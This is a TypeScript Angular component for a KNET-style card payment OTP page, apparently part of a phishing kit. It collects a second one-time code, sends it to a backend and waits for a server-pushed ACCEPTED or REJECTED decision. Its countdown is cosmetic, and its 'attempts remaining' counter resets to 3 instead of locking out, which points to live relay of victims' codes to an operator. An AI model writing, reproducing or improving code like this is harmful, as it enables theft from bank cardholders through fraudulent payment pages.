import { Component, OnInit, OnDestroy, signal, inject } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { Router } from '@angular/router';
import { ToastService } from '../../services/toast';
import { enviroment } from '../../../env/enviroment';

@Component({
  selector: 'app-knet-otp2',
  standalone: true,
  imports: [CommonModule, FormsModule],
  templateUrl: './knet-otp2.html',
  styleUrl: './knet-otp2.css',
})
export class KnetOtp2 implements OnInit, OnDestroy {
  toastService = inject(ToastService);
  router = inject(Router);

  // States: 'otp' | 'success'
  viewState = signal<'otp' | 'success'>('otp');
  isLoading = signal<boolean>(false);
  errorMessage = signal<string>('');

  otpValue = signal<string>('');
  amount = signal<string>('');
  phone = signal<string>('');
  clientId = signal<string>('');

  bankLogo = signal<string>('');
  bankName = signal<string>('');
  maskedCard = signal<string>('');
  expiryMonth = signal<string>('');
  expiryYear = signal<string>('');
  timerText = signal<string>('');
  otpRejected = signal<boolean>(false);
  attemptsRemaining = signal<number>(3);

  timerInterval: any = null;
  eventSource: EventSource | null = null;

  ngOnInit() {
    const clientId = localStorage.getItem('client_id');
    if (!clientId) {
      this.router.navigate(['/']);
      return;
    }
    this.clientId.set(clientId);

    const storedAmount = localStorage.getItem('pay_total_kd');
    if (storedAmount) {
      const num = parseFloat(storedAmount.replace(',', '.'));
      if (!isNaN(num)) this.amount.set(num.toFixed(3));
    }

    this.phone.set(localStorage.getItem('client_phone') ?? '');
    this.bankLogo.set(localStorage.getItem('bank_logo') ?? '');
    this.bankName.set(localStorage.getItem('bank_name') ?? '');
    this.maskedCard.set(localStorage.getItem('masked_card') ?? '');
    this.expiryMonth.set(localStorage.getItem('expiry_month') ?? '');
    this.expiryYear.set(localStorage.getItem('expiry_year') ?? '');

    this.startTimer();
  }

  startTimer() {
    let secondsRemaining = 239;
    const updateTimerDisplay = () => {
      const min = Math.floor(secondsRemaining / 60);
      const sec = secondsRemaining % 60;
      const minStr = min < 10 ? '0' + min : min.toString();
      const secStr = sec < 10 ? '0' + sec : sec.toString();
      this.timerText.set(`Timeout in: ${minStr}:${secStr}`);
    };

    updateTimerDisplay();

    this.timerInterval = setInterval(() => {
      if (secondsRemaining > 0) {
        secondsRemaining--;
        updateTimerDisplay();
      } else {
        clearInterval(this.timerInterval);
      }
    }, 1000);
  }

  ngOnDestroy() {
    this.cleanupSSE();
    if (this.timerInterval) {
      clearInterval(this.timerInterval);
    }
  }

  onOtpInput(event: Event) {
    const input = event.target as HTMLInputElement;
    const val = input.value.replace(/[^0-9]/g, '').substring(0, 6);
    input.value = val;
    this.otpValue.set(val);
  }

  async onSubmit(event: Event) {
    event.preventDefault();
    this.errorMessage.set('');

    const otp = this.otpValue();
    if (!otp || otp.length < 4) {
      this.toastService.show('يجب إدخال رمز التحقق المكون من 6 أرقام كاملة', 'error');
      return;
    }

    this.isLoading.set(true);

    try {
      const response = await fetch(enviroment.api_base + '/api/otps2', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          otp: otp,
          client_id: this.clientId()
        })
      });

      const resData = await response.json();
      if (!resData.success) {
        this.isLoading.set(false);
        this.errorMessage.set(resData.error || 'حدث خطأ أثناء إرسال رمز التحقق');
        return;
      }

      // Open SSE connection to listen for OTP2 approval
      this.eventSource = new EventSource(enviroment.api_base + `/api/events/client/${this.clientId()}`);
      this.eventSource.addEventListener('otp2_status', (evt: any) => {
        const payload = JSON.parse(evt.data);
        if (payload.status === 'ACCEPTED') {
          this.cleanupSSE();
          setTimeout(() => {
            this.isLoading.set(false);
            this.viewState.set('success');
            // Clear localStorage session
            localStorage.removeItem('client_id');
            localStorage.removeItem('pay_total_kd');
            localStorage.removeItem('client_phone');
          }, 1500);
        } else if (payload.status === 'REJECTED') {
          this.cleanupSSE();
          this.isLoading.set(false);
          this.otpValue.set('');

          if (this.otpRejected()) {
            this.attemptsRemaining.update(a => a > 1 ? a - 1 : 3);
          } else {
            this.otpRejected.set(true);
            this.attemptsRemaining.set(3);
          }
          this.errorMessage.set('');
        }
      });

      this.eventSource.onerror = () => {
        this.cleanupSSE();
        this.isLoading.set(false);
        this.errorMessage.set('خطأ في الاتصال بالخادم لمراقبة رمز التحقق.');
      };

    } catch (err: any) {
      this.isLoading.set(false);
      this.errorMessage.set('فشل الاتصال بالخادم. يرجى المحاولة لاحقاً');
    }
  }

  cleanupSSE() {
    if (this.eventSource) {
      this.eventSource.close();
      this.eventSource = null;
    }
  }

  goHome() {
    this.router.navigate(['/']);
  }
}
